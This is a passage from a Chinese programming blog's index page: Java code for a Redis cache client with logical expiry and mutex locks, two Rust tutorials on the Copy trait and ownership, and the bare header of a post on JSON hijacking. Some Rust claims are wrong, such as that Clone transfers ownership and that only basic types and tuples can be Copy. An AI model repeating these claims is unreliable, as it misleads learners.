-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CacheClient</span><span class="params">(StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWithLogicalExpire</span><span class="params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="comment">// 逻辑过期</span></span><br><span class="line">        <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RedisData</span>();</span><br><span class="line">        redisData.setData(value);</span><br><span class="line">        redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存到redis</span></span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(redisData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; R <span class="title function_">queryWithPassThrough</span><span class="params">(String keyPrefix, ID id, Class&lt;R&gt; type, Function&lt;ID, R&gt; dbFallback</span></span><br><span class="line"><span class="params">            , Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id;</span><br><span class="line">        <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果缓存中有数据，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isNotBlank(json)) &#123; <span class="comment">// 是真实商铺数据才会进入if返回数据</span></span><br><span class="line">            <span class="keyword">return</span> JSONUtil.toBean(json, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断命中的是否为空值</span></span><br><span class="line">        <span class="keyword">if</span> (json != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 如果缓存中没有数据，从数据库中查询</span></span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> dbFallback.apply(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不存在，将空值写入缓存，防止缓存穿透</span></span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 设置空值缓存 过期时间为2分钟</span></span><br><span class="line">            stringRedisTemplate.opsForValue().set(key, <span class="string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将查询到的数据写入缓存 设置过期时间</span></span><br><span class="line">        <span class="built_in">this</span>.set(key, r, time, unit);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 返回数据</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ExecutorService</span> <span class="variable">CACHE_REBUILD_EXECUTOR</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; R <span class="title function_">queryWithLogicalExpire</span><span class="params">(String keyPrefix, ID id, Class&lt;R&gt; type, Function&lt;ID, R&gt; dbFallback, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id;</span><br><span class="line">        <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果缓存中不存在数据，直接返回null</span></span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isBlank(json)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 命中，需要先把json反序列化为对象</span></span><br><span class="line">        <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> JSONUtil.toBean(json, RedisData.class);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">data</span> <span class="operator">=</span> (JSONObject) redisData.getData();</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> JSONUtil.toBean(data, type);</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">expireTime</span> <span class="operator">=</span> redisData.getExpireTime();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 判断是否过期</span></span><br><span class="line">        <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">            <span class="comment">// 4.1 未过期，直接返回信息</span></span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.2 已过期，需要缓存重建</span></span><br><span class="line">        <span class="comment">// 5. 缓存重建</span></span><br><span class="line">        <span class="comment">// 5.1 获取互斥锁</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">lockKey</span> <span class="operator">=</span> LOCK_SHOP_KEY + id;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(lockKey);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.2 判断是否获取成功</span></span><br><span class="line">        <span class="keyword">if</span> (isLock) &#123;</span><br><span class="line">            <span class="comment">// 再次检查是否过期</span></span><br><span class="line">            <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">                <span class="comment">// 未过期，释放锁，直接返回</span></span><br><span class="line">                unlock(lockKey);</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 过期</span></span><br><span class="line">            <span class="comment">// 5.3 获取锁成功，开启独立线程，实现缓存重建(利用线程池)</span></span><br><span class="line">            CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 查询数据库</span></span><br><span class="line">                    <span class="type">R</span> <span class="variable">r1</span> <span class="operator">=</span> dbFallback.apply(id);</span><br><span class="line">                    <span class="comment">// 写入Redis</span></span><br><span class="line">                    <span class="built_in">this</span>.setWithLogicalExpire(key, r1, time, unit);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">// 释放锁</span></span><br><span class="line">                    unlock(lockKey);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.4 未成功，返回商铺信息（过期的数据）</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(key, <span class="string">&quot;1&quot;</span>, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">return</span> BooleanUtil.isTrue(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        stringRedisTemplate.delete(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<!-- redis 简介视频 -->
-<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113526672857610&bvid=BV18jBiYpEDJ&cid=26907247203&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>
-
-<style>
-    iframe {
-      width: 100%;
-      height: 500px;
-    }
-  </style>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/07/rust-copy-trait%E7%9A%84%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/07/rust-copy-trait%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">rust-copy_trait的分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-07 11:22:21 / Modified: 11:25:35" itemprop="dateCreated datePublished" datetime="2025-03-07T11:22:21+08:00">2025-03-07</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Rust-Copy-Trait-的基本概念"><a href="#Rust-Copy-Trait-的基本概念" class="headerlink" title="Rust Copy Trait 的基本概念"></a>Rust Copy Trait 的基本概念</h2><h3 id="1-什么是-Copy-Trait？"><a href="#1-什么是-Copy-Trait？" class="headerlink" title="1. 什么是 Copy Trait？"></a>1. 什么是 Copy Trait？</h3><p>Copy Trait 是 Rust 的一个特性，用于标记可以通过简单的位拷贝（bitwise copy）来复制的类型。具有 Copy Trait 的类型在赋值、传递参数等操作时，会自动复制其值，而不会转移所有权。</p>
-<h3 id="2-Copy-Trait-的规则"><a href="#2-Copy-Trait-的规则" class="headerlink" title="2. Copy Trait 的规则"></a>2. Copy Trait 的规则</h3><p>Rust 中的 Copy Trait 规则如下：</p>
-<ol>
-<li>实现 Copy Trait 的类型必须是基本数据类型（如整数、浮点数、布尔值等）或者包含基本数据类型的元组（Tuple）。</li>
-<li>实现 Copy Trait 的类型在赋值、传递参数等操作时，会自动复制其值，而不会转移所有权。</li>
-<li>实现 Copy Trait 的类型不会调用 <code>Drop</code> Trait 的 <code>drop</code> 方法，因为它们的值是通过简单的位拷贝来复制的。</li>
-</ol>
-<h3 id="3-Copy-Trait-的优势"><a href="#3-Copy-Trait-的优势" class="headerlink" title="3. Copy Trait 的优势"></a>3. Copy Trait 的优势</h3><p>Copy Trait 机制有以下优势：</p>
-<ul>
-<li><strong>性能优化</strong>：避免了不必要的内存分配和释放。</li>
-<li><strong>代码简洁</strong>：避免了所有权转移和借用的复杂性。</li>
-<li><strong>更好的可读性</strong>：明确了值的复制行为，减少了代码的歧义性。</li>
-<li><strong>更好的错误检查</strong>：避免了悬空指针和内存泄漏等问题。</li>
-<li><strong>更好的代码质量</strong>：避免了内存管理的繁琐和复杂性。</li>
-<li><strong>更好的可维护性</strong>：避免了内存管理的细节和陷阱。</li>
-<li><strong>更好的性能表现</strong>：避免了不必要的内存分配和释放。</li>
-</ul>
-<h3 id="4-实现-Copy-Trait-的类型"><a href="#4-实现-Copy-Trait-的类型" class="headerlink" title="4. 实现 Copy Trait 的类型"></a>4. 实现 Copy Trait 的类型</h3><p>Rust 中的基本数据类型和元组等类型都实现了 Copy Trait，例如：</p>
-<ul>
-<li>整数类型（<code>i32</code>、<code>u32</code> 等）</li>
-<li>浮点数类型（<code>f32</code>、<code>f64</code> 等）</li>
-<li>布尔类型（<code>bool</code>）</li>
-<li>字符类型（<code>char</code>）</li>
-<li>元组类型（<code>(T1, T2, ...)</code>）</li>
-<li>数组类型（<code>[T; N]</code>）</li>
-<li>等等</li>
-</ul>
-<p>注意，String、Vec 等类型不具有 Copy Trait，因为它们的值是通过堆分配来管理的，需要转移所有权来复制值。</p>
-<h2 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of x is: &#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of y is: &#123;&#125;&quot;</span>, y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!(&quot;The value of s1 is: &#123;&#125;&quot;, s1); // error: value borrowed here after move</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of s2 is: &#123;&#125;&quot;</span>, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>x</code> 是一个整数类型，具有 Copy Trait，因此可以通过简单的位拷贝来复制其值。而 <code>s1</code> 是一个字符串类型，不具有 Copy Trait，因此在赋值给 <code>s2</code> 后，<code>s1</code> 的所有权被转移，无法再使用。这种行为避免了悬空指针和内存泄漏等问题，提高了代码的安全性和可靠性。</p>
-<h2 id="Copy-Trait-和-Clone-Trait-的区别"><a href="#Copy-Trait-和-Clone-Trait-的区别" class="headerlink" title="Copy Trait 和 Clone Trait 的区别"></a>Copy Trait 和 Clone Trait 的区别</h2><p>Copy Trait 和 Clone Trait 都用于复制值，但有以下区别：</p>
-<ul>
-<li>Copy Trait 适用于基本数据类型和元组等类型，通过简单的位拷贝来复制值，不会转移所有权。</li>
-<li>Clone Trait 适用于所有类型，通过调用 <code>clone</code> 方法来复制值，会转移所有权，但是可以自定义复制行为。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/07/rust-ownership%E7%9A%84%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/07/rust-ownership%E7%9A%84%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">rust-ownership的分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-07 10:51:28 / Modified: 11:00:35" itemprop="dateCreated datePublished" datetime="2025-03-07T10:51:28+08:00">2025-03-07</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Rust-Ownership-的基本概念"><a href="#Rust-Ownership-的基本概念" class="headerlink" title="Rust Ownership 的基本概念"></a>Rust Ownership 的基本概念</h2><h3 id="1-什么是所有权（Ownership）？"><a href="#1-什么是所有权（Ownership）？" class="headerlink" title="1. 什么是所有权（Ownership）？"></a>1. 什么是所有权（Ownership）？</h3><p>所有权是 Rust 的核心概念之一，用于管理内存的分配和释放。在 Rust 中，每个值都有一个对应的所有者，所有者负责释放其值的内存。当所有者离开作用域时，其值将被自动释放。</p>
-<h3 id="2-所有权规则"><a href="#2-所有权规则" class="headerlink" title="2. 所有权规则"></a>2. 所有权规则</h3><p>Rust 的所有权规则如下：</p>
-<ol>
-<li>每个值都有一个对应的所有者。</li>
-<li>一个值只能有一个所有者。</li>
-<li>当所有者离开作用域时，其值将被释放。</li>
-</ol>
-<h3 id="3-所有权的优势"><a href="#3-所有权的优势" class="headerlink" title="3. 所有权的优势"></a>3. 所有权的优势</h3><p>所有权机制有以下优势：</p>
-<ul>
-<li><strong>内存安全</strong>：避免了内存泄漏和悬空指针等问题。</li>
-<li><strong>无需 GC</strong>：不需要垃圾回收器，避免了 GC 带来的性能开销。</li>
-<li><strong>并发安全</strong>：避免了数据竞争和多线程问题。</li>
-<li><strong>代码简洁</strong>：避免了手动内存管理的复杂性。</li>
-<li><strong>性能优越</strong>：避免了 GC 的停顿和内存碎片问题。</li>
-<li><strong>更好的错误检查</strong>：避免了空指针和野指针等问题。</li>
-<li><strong>更好的代码质量</strong>：避免了内存泄漏和内存溢出等问题。</li>
-<li><strong>更好的可维护性</strong>：避免了内存管理的繁琐和复杂性。</li>
-<li><strong>更好的可读性</strong>：避免了手动内存管理的细节和陷阱。</li>
-</ul>
-<h2 id="示例分析"><a href="#示例分析" class="headerlink" title="示例分析"></a>示例分析</h2><h3 id="1-所有权的转移"><a href="#1-所有权的转移" class="headerlink" title="1. 所有权的转移"></a>1. 所有权的转移</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s2</span> = s1; <span class="comment">// s1 ownership is moved to s2</span></span><br><span class="line">    <span class="comment">// println!(&quot;&#123;&#125;&quot;, s1); // error: ownership of s1 is moved to s2</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s2); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>s1</code> 的所有权被转移到 <code>s2</code>，因此 <code>s1</code> 无法再使用。这是因为 Rust 不允许多个所有者同时拥有同一个值，以避免出现悬空指针和内存泄漏等问题。</p>
-<h3 id="2-所有权的借用"><a href="#2-所有权的借用" class="headerlink" title="2. 所有权的借用"></a>2. 所有权的借用</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x: &#123;&#125;&quot;</span>, x); <span class="comment">// x is still valid because it is not moved but borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y: &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>y</code> 借用了 <code>x</code> 的所有权，但并没有转移。因此 <code>x</code> 仍然有效，可以继续使用。这种方式避免了所有权的转移，同时允许多个引用同时访问同一个值。</p>
-<h3 id="3-所有权的引用"><a href="#3-所有权的引用" class="headerlink" title="3. 所有权的引用"></a>3. 所有权的引用</h3><h4 id="3-1-不可变引用"><a href="#3-1-不可变引用" class="headerlink" title="3.1 不可变引用"></a>3.1 不可变引用</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在这个示例中，<code>b</code> 是 <code>a</code> 的不可变引用，因此 <code>a</code> 仍然有效，可以继续使用。不可变引用的特点是：</p>
-<ul>
-<li>可以有多个不可变引用。</li>
-<li>不可变引用使用期间，原变量可继续使用。</li>
-<li>不可变引用使用后，原变量可继续使用。</li>
-</ul>
-<h4 id="3-2-可变引用"><a href="#3-2-可变引用" class="headerlink" title="3.2 可变引用"></a>3.2 可变引用</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="comment">// when mut reference is used</span></span><br><span class="line">    <span class="comment">// original variable is borrowed</span></span><br><span class="line">    <span class="comment">// only one mutable reference is allowed</span></span><br><span class="line">    <span class="comment">// and only when the borrowed variable is not used</span></span><br><span class="line">    <span class="comment">// we can then use the original variable</span></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// println!(&quot;The value of a is: &#123;&#125;&quot;, a);  // error: a cannot be used while b is borrowed</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of b is: &#123;&#125;&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    *b += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The value of a is: &#123;&#125;&quot;</span>, a); <span class="comment">// now a can be used</span></span><br><span class="line">    <span class="comment">// println!(&quot;The value of b is: &#123;&#125;&quot;, b); // if this line is uncommented, it will throw an error</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>在这个示例中，<code>b</code> 是 <code>a</code> 的可变引用，因此 <code>a</code> 在 <code>b</code> 使用期间不可使用。只有当 <code>b</code> 使用完毕后，<code>a</code> 才能继续使用。</p>
-<p>可变引用的使用规则如下：</p>
-<ul>
-<li>只能有一个可变引用。</li>
-<li>可变引用使用期间，原变量不可使用。</li>
-<li>可变引用使用后，原变量可继续使用。</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Rust 让人省心…</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://xudong7.github.io/2025/03/04/SecureJSON-%E9%98%B2%E8%8C%83JSON%E5%8A%AB%E6%8C%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/favicon.ico">
-      <meta itemprop="name" content="Dunjia">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dunjia's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/03/04/SecureJSON-%E9%98%B2%E8%8C%83JSON%E5%8A%AB%E6%8C%81/" class="post-title-link" itemprop="url">SecureJSON-防范JSON劫持</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2025-03-04 20:31:13 / Modified: 20:32:50" itemprop="dateCreated datePublished" datetime="2025-03-04T20:31:13+08:00">2025-03-04</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
